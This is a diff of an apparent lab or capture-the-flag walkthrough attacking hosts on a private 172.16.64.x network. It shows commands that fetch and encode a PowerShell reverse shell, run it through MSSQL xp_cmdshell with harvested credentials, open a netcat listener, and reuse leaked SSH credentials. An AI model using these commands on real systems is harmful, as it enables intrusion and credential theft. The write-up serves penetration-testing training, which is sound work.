@@ -115,16 +115,48 @@ Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 #### 172.16.64.199
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.64.11 -f ps1 > rv.ps1
+wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1;
+sed -i 's/127.0.0.1/172.16.64.10/; s/413/1234/' mini-reverse.ps1
+cat mini-reverse.ps1 | iconv -f ascii -t utf16 | tail -c +3  | base64 -w 0 > encoded_payload
+cat encoded_payload # We'll use this payload in our shell
+# Open listener In your terminal
 ```
 
-```text
-python2 /usr/share/doc/python3-impacket/examples/mssqlclient.py fooadmin@172.16.64.199
+```bash
+nc -lvnp 1234
+```
+
+```bash
+# Use the credentials found in the fuzzed file under 
+# project/backup/test in the previous machine
+python2 /usr/share/doc/python3-impacket/examples/mssqlclient.py fooadmin:fooadmin@172.16.64.199
 enable_xp_cmdshell
 RECONFIGURE
 xp_cmdshell whoami
-xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\"http://172.16.64.10:8080/revshell.ps1\")
+xp_cmdshell powershell -e <payload_from_previous_step>
 ```
 
+```text
+cd c:\
+where /r c:\ flag.txt
+cd c:\Users\AdminELS\Desktop\
+cat flag.txt
+Congratulations! You exploited this machine! 
+PS C:\Users\AdminELS\Desktop> cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################
+```
 
+We find at the end of the `id_rsa.pub` file there are some ssh credentials for the remaining active machine:
+
+#### 172.16.64.182
+
+We use the credentials harvested in the Windows machine:
+
+```bash
+sshpass -p dF3334slKw ssh developer@172.16.64.182
+find . | grep flag
+cat flag.txt 
+Congratulations, you got it!
+
+```
 
